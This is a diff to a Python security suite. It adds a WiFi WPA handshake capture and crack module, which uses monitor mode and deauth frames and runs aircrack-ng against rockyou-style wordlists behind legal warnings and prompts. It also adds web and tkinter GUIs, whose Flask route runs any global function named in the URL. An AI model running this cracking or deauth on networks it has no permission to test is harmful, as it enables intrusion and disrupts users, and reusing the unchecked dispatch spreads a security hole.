+                    nets.append({"ssid": parts[0] or "(hidden)", "bssid": parts[1],
+                                 "signal": parts[2], "chan": parts[3], "enc": parts[4],
+                                 "band": _wifi_band(parts[3])})
+            if nets:
+                return nets
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=30)
+        if r.returncode == 0 and r.stdout.strip():
+            cells = re.split(r'\n\s*Cell\s', "\n" + r.stdout)
+            for cell in cells[1:]:
+                m = re.search(r'Address: ([0-9A-Fa-f:]+)', cell)
+                e = re.search(r'ESSID:"(.*?)"', cell)
+                ch = re.search(r'Channel[: ]+(\d+)', cell)
+                s = re.search(r'Signal level=(-?\d+)', cell)
+                enc = "Open" if 'Encryption key:off' in cell else "WPA"
+                chan = ch.group(1) if ch else "?"
+                ssid = e.group(1) if e else ""
+                nets.append({"ssid": ssid if ssid else "(hidden)",
+                             "bssid": m.group(1) if m else "?",
+                             "chan": chan,
+                             "signal": s.group(1) if s else "?",
+                             "enc": enc,
+                             "band": _wifi_band(chan)})
+    except Exception:
+        pass
+    if not nets:
+        try:
+            iface = _find_wifi_iface()
+            if iface:
+                r = subprocess.run(["iw", "dev", iface, "scan"], capture_output=True, text=True, timeout=30)
+                if r.returncode == 0 and r.stdout.strip():
+                    for block in re.split(r'\nBSS ', r.stdout):
+                        if not block.strip():
+                            continue
+                        m = re.search(r'^([0-9a-f:]{17})', block)
+                        e = re.search(r'SSID:(\S+)', block)
+                        ch = re.search(r'primary channel: (\d+)', block)
+                        s = re.search(r'signal: (-?\d+\.\d+)', block)
+                        enc = "Open" if 'WPA' not in block and 'RSN' not in block else "WPA"
+                        chan = ch.group(1) if ch else "?"
+                        ssid = e.group(1) if e else ""
+                        nets.append({"ssid": ssid if ssid else "(hidden)",
+                                     "bssid": m.group(1) if m else "?",
+                                     "chan": chan,
+                                     "signal": s.group(1).split('.')[0] if s else "?",
+                                     "enc": enc,
+                                     "band": _wifi_band(chan)})
+        except Exception:
+            pass
+    return nets
+
+def _wifi_legal_warning(network=None):
+    print(f"\n  {RED}{BOLD}{'='*62}{RESET}")
+    print(f"  {RED}{BOLD}  LEGAL WARNING — READ CAREFULLY{RESET}")
+    print(f"  {RED}{'='*62}{RESET}")
+    print(f"  {YELLOW}  Capturing WPA handshakes and recovering passwords is ONLY legal{RESET}")
+    print(f"  {YELLOW}  on networks YOU OWN or have EXPLICIT WRITTEN PERMISSION to test{RESET}")
+    print(f"  {YELLOW}  from the network owner/administrator.{RESET}")
+    if network:
+        print(f"  {YELLOW}  Target: {c(network['ssid'], Fore.CYAN)}  ({network['bssid']}){RESET}")
+    print(f"  {RED}  Unauthorized use is a criminal offence under computer-fraud /{RESET}")
+    print(f"  {RED}  unauthorised-access laws in most countries.{RESET}")
+    print(f"  {RED}{'='*62}{RESET}\n")
+
+def wifi_password_audit():
+    header_box("WiFi Password Audit (WPA Handshake)", Fore.MAGENTA)
+    if platform.system().lower() != "linux":
+        print(f"  {RED}This module needs Linux tools (airmon-ng / airodump-ng / aircrack-ng).{RESET}")
+        print(f"  {YELLOW}Use a Kali/Parrot live USB or VM on other platforms.{RESET}")
+        return
+    _wifi_legal_warning()
+    try:
+        ans = input(f"  {c(f'Do you understand and own (or have permission for) this network? (yes/no) {SYM_PROMPT} ', Fore.YELLOW)}").strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        return
+    if ans != "yes":
+        print(f"  {YELLOW}Cancelled. Stay legal and ethical.{RESET}\n")
+        return
+    if not _is_root():
+        print(f"  {RED}Root privileges are required for monitor mode and packet capture.{RESET}")
+        print(f"  {YELLOW}Re-run as root: sudo python3 tool.py  (or: sudo darkie-tools){RESET}\n")
+        return
+    missing = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not shutil.which(t)]
+    if missing:
+        print(f"  {YELLOW}Missing tools: {', '.join(missing)}{RESET}")
+        try:
+            ans = input(f"  {c(f'Install the aircrack-ng suite now? (y/n) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            return
+        if ans == "y":
+            _run_as_admin(["apt-get", "install", "-y", "-qq", "aircrack-ng"], "Installing aircrack-ng suite")
+            missing = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not shutil.which(t)]
+        if missing:
+            print(f"  {RED}aircrack-ng suite still missing. Install it manually (e.g. apt install aircrack-ng).{RESET}\n")
+            return
+    print(f"  {c('Scanning for nearby WiFi networks...', Fore.MAGENTA)}")
+    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
+    nets = _wifi_scan_networks()
+    if not nets:
+        print(f"  {RED}No WiFi networks found. Is WiFi enabled?{RESET}\n")
+        return
+    connected = _wifi_connected_ssid()
+    connected_bssid = _wifi_connected_bssid()
+    for i, n in enumerate(nets):
+        sig = "??" if n["signal"] in ("", "?") else n["signal"]
+        enc = n["enc"] if n["enc"] not in ("", "--") else "Open"
+        color = Fore.GREEN if enc == "Open" else Fore.YELLOW
+        band = n.get("band", "?")
+        marker = ""
+        net_bssid = n["bssid"].lower() if n["bssid"] else ""
+        if connected_bssid and net_bssid == connected_bssid:
+            marker = f"  {c('<- CONNECTED', Fore.RED)}"
+        print(f"  {c(f'[{i+1}]', Fore.CYAN)}  {c(n['ssid'][:28].ljust(28), color)}  ch {c(n['chan'], Fore.CYAN):>4}  {c(band, Fore.MAGENTA):>4}  {c(sig, Fore.CYAN):>5}  {c(enc, Fore.BLUE):>5}{marker}")
+    print()
+    if connected:
+        print(f"  {YELLOW}Tip: only your CONNECTED AP drops when monitor mode starts.{RESET}")
+        print(f"  {YELLOW}Pick a different network (or a different band) to stay online.{RESET}\n")
+    try:
+        pick = input(f"  {c(f'Which network? (1-{len(nets)}) or [b] back {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        return
+    if pick == "b":
+        return
+    if not pick.isdigit() or not (1 <= int(pick) <= len(nets)):
+        print(f"  {RED}Invalid choice.{RESET}\n")
+        return
+    net = nets[int(pick) - 1]
+    _wifi_legal_warning(net)
+    try:
+        _q = f"Capture the WPA handshake for {net['ssid']} now? (yes/no) {SYM_PROMPT} "
+        ans = input(f"  {c(_q, Fore.YELLOW)}").strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        return
+    if ans != "yes":
+        print(f"  {YELLOW}Cancelled.{RESET}\n")
+        return
+    all_ifaces = _all_wifi_ifaces()
+    iface = _find_wifi_iface()
+    if not iface and all_ifaces:
+        iface = all_ifaces[0]
+    if not iface:
+        print(f"  {RED}No wireless interface found.{RESET}\n")
+        return
+    spare = None
+    if len(all_ifaces) > 1:
+        connected = _wifi_connected_ssid()
+        connected_iface = None
+        try:
+            r = subprocess.run(["iwgetid"], capture_output=True, text=True, timeout=10)
+            mm = re.search(r'^(\S+)\s+ESSID:', r.stdout, re.M)
+            if mm:
+                connected_iface = mm.group(1)
+        except Exception:
+            pass
+        for a in all_ifaces:
+            if a != connected_iface:
+                spare = a
+                break
+        if spare:
+            print(f"  {c(f'Using spare adapter {spare} for monitor mode — your connection on {connected_iface} stays up.', Fore.GREEN)}")
+            iface = spare
+    print(f"  {c(f'Wireless interface: {iface}', Fore.CYAN)}")
+    print(f"\n  {RED}{BOLD}{'='*62}{RESET}")
+    print(f"  {RED}{BOLD}  MONITOR MODE = INTERNET WILL DROP{RESET}")
+    print(f"  {RED}{'='*62}{RESET}")
+    print(f"  {YELLOW}  Putting {iface} into monitor mode disconnects your current WiFi{RESET}")
+    print(f"  {YELLOW}  connection for the duration of the capture.{RESET}")
+    print(f"  {YELLOW}  Your connection returns automatically once monitor mode is{RESET}")
+    print(f"  {YELLOW}  stopped (your saved network auto-reconnects).{RESET}")
+    print(f"  {RED}{'='*62}{RESET}\n")
+    try:
+        ok = input(f"  {c(f'Continue (your WiFi will briefly drop)? (yes/no) {SYM_PROMPT} ', Fore.YELLOW)}").strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        ok = "no"
+    if ok != "yes":
+        print(f"  {YELLOW}Cancelled. Your connection is untouched.{RESET}\n")
+        return
+    print(f"  {c('Enabling monitor mode...', Fore.MAGENTA)}")
+    subprocess.run(["airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
+    mon = None
+    iw_out = ""
+    try:
+        iw_out = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10).stdout
+    except Exception:
+        pass
+    for cand in (f"{iface}mon", "mon0", iface):
+        if os.path.exists(f"/sys/class/net/{cand}") or f"Interface {cand}" in iw_out:
+            mon = cand
+            break
+    if not mon:
+        try:
+            mon = input(f"  {c(f'Monitor interface name? {SYM_PROMPT} ', Fore.CYAN)}").strip() or iface
+        except (EOFError, KeyboardInterrupt):
+            mon = iface
+    capbase = os.path.join("/tmp", f"darkie_cap_{int(time.time())}")
+    _q = f"Capturing handshake from {net['ssid']} (ch {net['chan']})..."
+    print(f"  {c(_q, Fore.GREEN)}")
+    print(f"  {YELLOW}If no client connects, we can send a deauth to force a reconnect.{RESET}")
+    print(f"  {c('Press Enter to stop early, or wait 20s.', Fore.CYAN)}")
+    cmd = ["airodump-ng", "--bssid", net["bssid"], "-c", net["chan"], "-w", capbase, "--write-interval", "1", mon]
+    import select
+    captured = False
+    try:
+        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+    except Exception as e:
+        print(f"  {RED}Failed to start airodump-ng: {e}{RESET}")
+        subprocess.run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return
+    try:
+        deadline = time.time() + 20
+        while time.time() < deadline:
+            rdy, _, _ = select.select([p.stdout], [], [], 1.0)
+            if p.stdout in rdy:
+                line = p.stdout.readline()
+                if line:
+                    out = line.rstrip("\r\n")
+                    if out.strip():
+                        print(f"  {c(out.strip()[:120], Fore.CYAN)}")
+                    if "handshake" in line.lower():
+                        captured = True
+                        break
+            if p.poll() is not None:
+                break
+    except KeyboardInterrupt:
+        pass
+    p.terminate()
+    try:
+        p.wait(timeout=5)
+    except Exception:
+        p.kill()
+    if not captured:
+        print(f"  {YELLOW}No handshake yet — a client must connect for the 4-way handshake.{RESET}")
+        try:
+            _q = f"Send deauth frames to force {net['ssid']} clients to reconnect? (y/n) {SYM_PROMPT} "
+            ans = input(f"  {c(_q, Fore.YELLOW)}").strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            ans = "n"
+        if ans == "y":
+            _wifi_legal_warning(net)
+            try:
+                _q = f"Confirm deauth on {net['ssid']} (own/permitted network only)? (yes/no) {SYM_PROMPT} "
+                ok = input(f"  {c(_q, Fore.YELLOW)}").strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                ok = "no"
+            if ok == "yes":
+                print(f"  {c('Sending deauth frames...', Fore.MAGENTA)}")
+                subprocess.run(["aireplay-ng", "-0", "5", "-a", net["bssid"], mon],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
+                try:
+                    deadline = time.time() + 20
+                    while time.time() < deadline:
+                        rdy, _, _ = select.select([p.stdout], [], [], 1.0)
+                        if p.stdout in rdy:
+                            line = p.stdout.readline()
+                            if line and "handshake" in line.lower():
+                                captured = True
+                                break
+                        if p.poll() is not None:
+                            break
+                except KeyboardInterrupt:
+                    pass
+        else:
+            try:
+                _q = f"Keep listening for {net['ssid']} a bit longer? (y/n) {SYM_PROMPT} "
+                ans = input(f"  {c(_q, Fore.CYAN)}").strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                ans = "n"
+            if ans == "y":
+                try:
+                    deadline = time.time() + 20
+                    while time.time() < deadline:
+                        rdy, _, _ = select.select([p.stdout], [], [], 1.0)
+                        if p.stdout in rdy:
+                            line = p.stdout.readline()
+                            if line and "handshake" in line.lower():
+                                captured = True
+                                break
+                        if p.poll() is not None:
+                            break
+                except KeyboardInterrupt:
+                    pass
+    p.terminate()
+    try:
+        p.wait(timeout=5)
+    except Exception:
+        p.kill()
+    os.system("stty sane 2>/dev/null")
+    subprocess.run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    cap = None
+    try:
+        base = os.path.basename(capbase)
+        cands = [os.path.join("/tmp", f) for f in os.listdir("/tmp")
+                 if f.startswith(base) and f.endswith(".cap")]
+        if cands:
+            cap = max(cands, key=os.path.getmtime)
+    except Exception:
+        pass
+    if not cap or not os.path.exists(cap) or os.path.getsize(cap) == 0:
+        print(f"  {RED}No capture saved. The interface may need monitor mode enabled first.{RESET}\n")
+        return
+    vr = subprocess.run(["aircrack-ng", cap], capture_output=True, text=True)
+    if not captured and "handshake" not in vr.stdout.lower():
+        print(f"  {RED}No valid WPA handshake in the capture.{RESET}")
+        print(f"  {YELLOW}Try again with better signal or wait for a client to connect.{RESET}\n")
+        return
+    print(f"  {GREEN}{SYM_CHECK} Handshake captured!{RESET}")
+    default_wl = next((w for w in (os.path.expanduser("~/.darkie-tools/wordlist.txt"),
+                                   "/usr/share/wordlists/rockyou.txt",
+                                   "/usr/share/wordlists/fasttrack.txt",
+                                   "/usr/share/john/password.lst") if os.path.exists(w)), "")
+    if default_wl:
+        print(f"  {c(f'Auto-using wordlist: {default_wl}', Fore.MAGENTA)}")
+        wl = default_wl
+    else:
+        print(f"  {YELLOW}No wordlist found. Place one at ~/.darkie-tools/wordlist.txt or type its path.{RESET}")
+        _wl_hint = "type full path to wordlist"
+        while True:
+            try:
+                wl = input(f"  {c(f'Wordlist path [{_wl_hint}] {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            except (EOFError, KeyboardInterrupt):
+                return
+            if not wl:
+                print(f"  {RED}No wordlist given.{RESET}\n")
+                return
+            if not os.path.exists(wl):
+                print(f"  {YELLOW}File not found: {wl}{RESET}")
+                continue
+            break
+    print(f"  {c(f'Running aircrack-ng against {os.path.basename(wl)} ...', Fore.MAGENTA)}")
+    cr = subprocess.run(["aircrack-ng", "-b", net["bssid"], "-w", wl, cap], capture_output=True, text=True, timeout=3600)
+    out = cr.stdout + cr.stderr
+    m = re.search(r"KEY FOUND!\s*\[\s*([^\]\r\n]+)\s*\]", out)
+    if m:
+        pw = m.group(1).strip()
+        print(f"\n  {GREEN}{BOLD}{SYM_CHECK} PASSWORD FOUND: {c(pw, Fore.GREEN)}{RESET}")
+        _net = f"Network: {net['ssid']}  ({net['bssid']})"
+        print(f"  {c(_net, Fore.CYAN)}")
+        add_log_alert("INFO", "WiFi", f"Handshake cracked for {net['ssid']}")
+    else:
+        print(f"  {RED}Password not found in this wordlist.{RESET}")
+        print(f"  {YELLOW}Try a larger wordlist (e.g. rockyou.txt) or a rules-based attack.{RESET}")
+    print()
+
+# ──────────────────────────────────────────────────────────
 #  MODULE 16: REPORT GENERATOR
 # ──────────────────────────────────────────────────────────
 
@@ -6760,12 +7572,13 @@ def menu_wifi():
         print(f"  {c('[1]', Fore.GREEN)}  WiFi Network Scanner")
         print(f"  {c('[2]', Fore.GREEN)}  WiFi Security Audit")
         print(f"  {c('[3]', Fore.GREEN)}  Deauth Detection Monitor")
+        print(f"  {c('[4]', Fore.GREEN)}  Password Audit (WPA handshake capture + crack)")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
         try:
             ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
             if ch == "b": break
-            {"1":wifi_scan,"2":wifi_security_audit,"3":wifi_deauth_monitor}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+            {"1":wifi_scan,"2":wifi_security_audit,"3":wifi_deauth_monitor,"4":wifi_password_audit}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
         except KeyboardInterrupt:
             break
         except Exception as e:
@@ -6792,32 +7605,637 @@ def menu_reports():
 #  MAIN ENTRY POINT
 # ──────────────────────────────────────────────────────────
 
+# ──────────────────────────────────────────────────────────
+#  GUI: Web Dashboard (Flask) + Desktop App (tkinter)
+#  Integrated directly into the tool — no extra files needed.
+# ──────────────────────────────────────────────────────────
+
+GUI_MODULES = [
+    {"id": "menu_network_threat", "name": "Network Threat Monitoring"},
+    {"id": "menu_endpoint", "name": "Endpoint Security"},
+    {"id": "menu_vuln", "name": "Vulnerability Management"},
+    {"id": "menu_data", "name": "Data Protection"},
+    {"id": "menu_pentest", "name": "Penetration Testing"},
+    {"id": "menu_siem", "name": "SIEM & Log Analysis"},
+    {"id": "menu_stress", "name": "Stress Testing"},
+    {"id": "menu_osint", "name": "OSINT Reconnaissance"},
+    {"id": "menu_telephone", "name": "Telephone Tools"},
+    {"id": "menu_netutils", "name": "Network Utilities"},
+    {"id": "menu_hash_crypto", "name": "Hash & Crypto"},
+    {"id": "menu_system_audit", "name": "System Audit"},
+    {"id": "menu_adv_network", "name": "Advanced Network"},
+    {"id": "menu_adv_osint", "name": "Advanced OSINT"},
+    {"id": "menu_wifi", "name": "WiFi & Wireless"},
+    {"id": "menu_reports", "name": "Reports"},
+    {"id": "osint_censys_search", "name": "Censys Search"},
+    {"id": "osint_recon_engine", "name": "Recon Engine"},
+]
+
+_WEB_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Darkie TOOLS v2.2 — Web Dashboard</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Courier New', monospace; background: #0d0d1a; color: #eee; padding: 20px; }
+  h1 { color: #e94560; border-bottom: 2px solid #533483; padding-bottom: 10px; margin-bottom: 6px; }
+  .sub { color: #888; font-size: 12px; margin-bottom: 16px; }
+  .module-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 8px; margin-bottom: 20px; }
+  .module-btn { background: #16213e; color: #eee; border: 1px solid #533483; padding: 10px 16px; cursor: pointer; font-family: inherit; font-size: 13px; text-align: left; border-radius: 4px; transition: all 0.2s; }
+  .module-btn:hover { background: #533483; border-color: #e94560; }
+  .module-btn.running { background: #e94560; color: #fff; }
+  #output { background: #1a1a2e; border: 1px solid #533483; border-radius: 4px; padding: 15px; height: 50vh; overflow-y: auto; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+  #output .info { color: #888; }
+  #output .success { color: #00ff88; }
+  #output .error { color: #ff4444; }
+  #output .warn { color: #ffaa00; }
+  ::-webkit-scrollbar { width: 8px; background: #0d0d1a; }
+  ::-webkit-scrollbar-thumb { background: #533483; border-radius: 4px; }
+  .status { color: #888; font-size: 12px; margin: 5px 0; }
+  .clear-btn { background: #333; color: #eee; border: 1px solid #555; padding: 6px 14px; cursor: pointer; border-radius: 4px; float: right; }
+  .clear-btn:hover { background: #e94560; }
+</style>
+</head>
+<body>
+<h1>Darkie TOOLS v2.2 — Web Dashboard</h1>
+<div class="sub">Click a module to run it. Output streams live below.</div>
+<div class="status">Connected. Select a module to run.</div>
+<div class="module-grid" id="modules"></div>
+<button class="clear-btn" onclick="clearOutput()">Clear Output</button>
+<h3 style="margin-top:10px;color:#00ccff;">Output</h3>
+<pre id="output"></pre>
+<script>
+const modules = MODULES_PLACEHOLDER;
+const grid = document.getElementById('modules');
+modules.forEach(m => {
+  const btn = document.createElement('button');
+  btn.className = 'module-btn';
+  btn.textContent = m.name;
+  btn.onclick = () => runModule(m.id, btn);
+  grid.appendChild(btn);
+});
+function runModule(id, btn) {
+  btn.classList.add('running');
+  btn.disabled = true;
+  const out = document.getElementById('output');
+  out.innerHTML += '<span class="info">[+] Running ' + id + '...</span>\\n';
+  out.scrollTop = out.scrollHeight;
+  fetch('/run/' + id).then(r => r.json()).then(d => {
+    btn.classList.remove('running');
+    btn.disabled = false;
+    if (d.error) out.innerHTML += '<span class="error">[!] ' + d.error + '</span>\\n';
+  });
+}
+let lastLen = 0;
+setInterval(() => {
+  fetch('/output').then(r => r.json()).then(d => {
+    const out = document.getElementById('output');
+    if (d.lines && d.lines.length > lastLen) {
+      for (let i = lastLen; i < d.lines.length; i++) {
+        const cls = d.tags[i] || 'info';
+        out.innerHTML += '<span class="' + cls + '">' + escapeHtml(d.lines[i]) + '</span>\\n';
+      }
+      lastLen = d.lines.length;
+      out.scrollTop = out.scrollHeight;
+    }
+  });
+}, 300);
+function clearOutput() {
+  document.getElementById('output').innerHTML = '';
+  fetch('/clear').then(r => r.json());
+  lastLen = 0;
+}
+function escapeHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+</script>
+</body>
+</html>"""
+
+
+def start_web_gui(host="127.0.0.1", port=5000):
+    """Run the clickable web dashboard in a browser (no extra files)."""
+    import builtins
+    import io as _io
+    try:
+        from flask import Flask, jsonify
+    except ImportError:
+        print(f"  {RED}{SYM_X} Flask is required for the Web Dashboard. Install: pip install flask{RESET}")
+        return
+    app = Flask(__name__)
+    current_output = []
+
+    def _index():
+        return _WEB_HTML.replace("MODULES_PLACEHOLDER", jsonify(GUI_MODULES).get_data(as_text=True))
+
+    def _run_module(module_id):
+        func = globals().get(module_id)
+        if not func:
+            return jsonify({"error": f"Module {module_id} not found"})
+
+        def wrapper():
+            old_out = sys.stdout
+            old_input = builtins.input
+            buf = _io.StringIO()
+            sys.stdout = buf
+
+            def auto_input(prompt=""):
+                current_output.append(("warn", f"[prompt] {prompt}"))
+                if module_id == "osint_censys_search":
+                    return ""
+                return "b"
+
+            builtins.input = auto_input
+            try:
+                func()
+            except Exception as e:
+                print(f"Error: {e}")
+            finally:
+                builtins.input = old_input
+                sys.stdout = old_out
+                for line in buf.getvalue().splitlines():
+                    current_output.append(("info", line))
+            current_output.append(("info", f"[+] {module_id} completed"))
+
+        threading.Thread(target=wrapper, daemon=True).start()
+        return jsonify({"status": "started"})
+
+    def _output():
+        lines = [l for _, l in current_output[-500:]]
+        tags = [t for t, _ in current_output[-500:]]
+        return jsonify({"lines": lines, "tags": tags})
+
+    def _clear():
+        current_output.clear()
+        return jsonify({"status": "ok"})
+
+    app.add_url_rule("/", "index", _index)
+    app.add_url_rule("/run/<module_id>", "run_module", _run_module)
+    app.add_url_rule("/output", "output", _output)
+    app.add_url_rule("/clear", "clear", _clear)
+
+    try:
+        import webbrowser
+        webbrowser.open(f"http://{host}:{port}")
+    except Exception:
+        pass
+    print(f"\n  {c('Web Dashboard started', Fore.GREEN)}")
+    print(f"  {c('Open in your browser:', Fore.CYAN)} http://{host}:{port}")
+    print(f"  {c('Press Ctrl+C to return to the menu.', Fore.YELLOW)}\n")
+    try:
+        app.run(host=host, port=port, debug=False)
+    except KeyboardInterrupt:
+        print(f"\n  {c('Web Dashboard stopped.', Fore.YELLOW)}")
+
+
+def start_desktop_gui():
+    """Run the clickable desktop app window (tkinter, no extra files)."""
+    try:
+        import tkinter as tk
+        from tkinter import ttk, scrolledtext
+    except Exception:
+        print(f"  {RED}{SYM_X} tkinter is not available on this system.{RESET}")
+        print(f"  {YELLOW}  Linux:  sudo apt install python3-tk   |   macOS:  brew install python-tk{RESET}")
+        print(f"  {YELLOW}  Tip: option [1] of the GUI menu opens the web dashboard instead.{RESET}")
+        return
+    import builtins
+    import io as _io
+    from queue import Queue
+
+    _BG = "#1a1a2e"
+    _BG2 = "#16213e"
+    _FG = "#e94560"
+    _ACCENT = "#533483"
+    _TEXT = "#eee"
+    _GREEN = "#00ff88"
+    _RED = "#ff4444"
+    _YELLOW = "#ffaa00"
+    _CYAN = "#00ccff"
+    _ANSI_RE = re.compile(r'\x1b\[[0-9;]*m')
+
+    def _strip_ansi(s):
+        return _ANSI_RE.sub('', s)
+
+    def _run_in_thread(target, args=(), kwargs=None):
+        threading.Thread(target=target, args=args, kwargs=kwargs or {}, daemon=True).start()
+
+    class _OutputRedirect(_io.StringIO):
+        def __init__(self, queue):
+            super().__init__()
+            self.queue = queue
+
+        def write(self, s):
+            if s.strip():
+                self.queue.put(_strip_ansi(s))
+            super().write(s)
+
+        def flush(self):
+            pass
+
+    class _PromptBridge:
+        def __init__(self, root):
+            self.root = root
+            self._result = None
+            self._event = threading.Event()
+
+        def ask(self, prompt=""):
+            self._event.clear()
+            self._result = None
+            self.root.after(0, self._show, prompt)
+            self._event.wait()
+            return self._result
+
+        def _show(self, prompt):
+            from tkinter import simpledialog
+            text = prompt.strip() or "Input"
+            self._result = simpledialog.askstring("Darkie Security Suite", text, parent=self.root)
+            self._event.set()
+
+    class _DarkieGUI:
+        def __init__(self, root):
+            self.root = root
+            self.prompt = _PromptBridge(self.root)
+            self.module_lock = threading.Lock()
+            self.root.title("Darkie Security Suite v2.2")
+            self.root.geometry("1100x780")
+            self.root.configure(bg=_BG)
+            self.root.minsize(900, 650)
+
+            style = ttk.Style()
+            style.theme_use("clam")
+            style.configure("TNotebook", background=_BG, borderwidth=0)
+            style.configure("TNotebook.Tab", background=_BG2, foreground=_TEXT, padding=[10, 5], font=("Segoe UI", 10, "bold"))
+            style.map("TNotebook.Tab", background=[("selected", _ACCENT)], foreground=[("selected", _FG)])
+            style.configure("TFrame", background=_BG)
+            style.configure("TLabel", background=_BG, foreground=_TEXT, font=("Segoe UI", 10))
+            style.configure("TButton", background=_ACCENT, foreground=_TEXT, font=("Segoe UI", 10, "bold"), padding=[8, 4])
+            style.map("TButton", background=[("active", _FG)])
+            style.configure("TEntry", fieldcolor=_BG2, foreground=_TEXT, insertcolor=_TEXT, font=("Consolas", 11))
+            style.configure("TLabelframe", background=_BG, foreground=_TEXT)
+            style.configure("TLabelframe.Label", background=_BG, foreground=_CYAN, font=("Segoe UI", 10, "bold"))
+
+            self.notebook = ttk.Notebook(self.root)
+            self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+            self.tabs = {}
+            self.out_queues = {}
+            self.stop_events = {}
+
+            modules = [
+                ("Network Threat", self._build_network_threat),
+                ("Endpoint", self._build_endpoint),
+                ("Vulnerability", self._build_vuln),
+                ("Data Protection", self._build_data),
+                ("Pentest", self._build_pentest),
+                ("SIEM", self._build_siem),
+                ("Stress Test", self._build_stress),
+                ("OSINT", self._build_osint),
+                ("Telephone", self._build_telephone),
+                ("Net Utils", self._build_netutils),
+                ("Hash & Crypto", self._build_hash_crypto),
+                ("Security Audit", self._build_audit),
+                ("Adv Network", self._build_adv_network),
+                ("Adv OSINT", self._build_adv_osint),
+                ("WiFi", self._build_wifi),
+                ("Reports", self._build_reports),
+                ("Console", self._build_console),
+            ]
+            for name, builder in modules:
+                frame = ttk.Frame(self.notebook)
+                self.notebook.add(frame, text=f" {name} ")
+                self.tabs[name] = frame
+                self.out_queues[name] = Queue()
+                self.stop_events[name] = threading.Event()
+                builder(frame)
+
+            self._poll_queues()
+
+        def _output_widget(self, parent):
+            txt = scrolledtext.ScrolledText(parent, wrap=tk.WORD, height=12,
+                                             bg=_BG2, fg=_TEXT, insertbackground=_TEXT,
+                                             font=("Consolas", 10), state=tk.DISABLED)
+            txt.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            return txt
+
+        def _add_output(self, parent, label="Output"):
+            frame = ttk.LabelFrame(parent, text=f" {label} ")
+            frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            return self._output_widget(frame)
+
+        def _add_button_row(self, parent, buttons, row_frame=None):
+            if row_frame is None:
+                row_frame = ttk.Frame(parent)
+            row_frame.pack(fill=tk.X, padx=5, pady=3)
+            for text, cmd in buttons:
+                b = ttk.Button(row_frame, text=text, command=cmd)
+                b.pack(side=tk.LEFT, padx=3)
+
+        def _poll_queues(self):
+            for name, q in self.out_queues.items():
+                try:
+                    while True:
+                        line = q.get_nowait()
+                        tab = self.tabs.get(name)
+                        if tab:
+                            for child in tab.winfo_children():
+                                if isinstance(child, ttk.LabelFrame):
+                                    for sub in child.winfo_children():
+                                        if isinstance(sub, scrolledtext.ScrolledText):
+                                            sub.configure(state=tk.NORMAL)
+                                            sub.insert(tk.END, line + "\n")
+                                            sub.see(tk.END)
+                                            sub.configure(state=tk.DISABLED)
+                except Exception:
+                    pass
+            self.root.after(100, self._poll_queues)
+
+        def _run_module(self, name, func):
+            if not self.module_lock.acquire(blocking=False):
+                self.root.after(0, lambda: self.log("A module is already running — finish or cancel it first."))
+                return
+            self.out_queues[name] = Queue()
+            old_stdout = sys.stdout
+            old_input = builtins.input
+            sys.stdout = _OutputRedirect(self.out_queues[name])
+            builtins.input = self.prompt.ask
+
+            def wrapper():
+                try:
+                    func()
+                except Exception as e:
+                    print(f"Error: {e}")
+                finally:
+                    builtins.input = old_input
+                    sys.stdout = old_stdout
+                    self.module_lock.release()
+
+            _run_in_thread(wrapper)
+
+        def _make_entry(self, parent, label, default="", row=0, col=0, label_col=0):
+            f = ttk.Frame(parent)
+            f.pack(fill=tk.X, padx=5, pady=2)
+            ttk.Label(f, text=label, width=20).pack(side=tk.LEFT)
+            var = tk.StringVar(value=default)
+            e = ttk.Entry(f, textvariable=var)
+            e.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+            return var
+
+        def _build_network_threat(self, parent):
+            self._add_button_row(parent, [
+                ("Capture", lambda: self._run_module("Network Threat", net_capture)),
+                ("Traffic Monitor", lambda: self._run_module("Network Threat", net_traffic_monitor)),
+                ("IDS", lambda: self._run_module("Network Threat", net_ids)),
+                ("ARP Detect", lambda: self._run_module("Network Threat", net_arp_detect)),
+                ("Port Scan Detect", lambda: self._run_module("Network Threat", net_portscan_detect)),
+                ("DDoS Detect", lambda: self._run_module("Network Threat", net_ddos_detect)),
+            ])
+            self._add_output(parent)
+
+        def _build_endpoint(self, parent):
+            self._add_button_row(parent, [
+                ("Process Monitor", lambda: self._run_module("Endpoint", ep_process_monitor)),
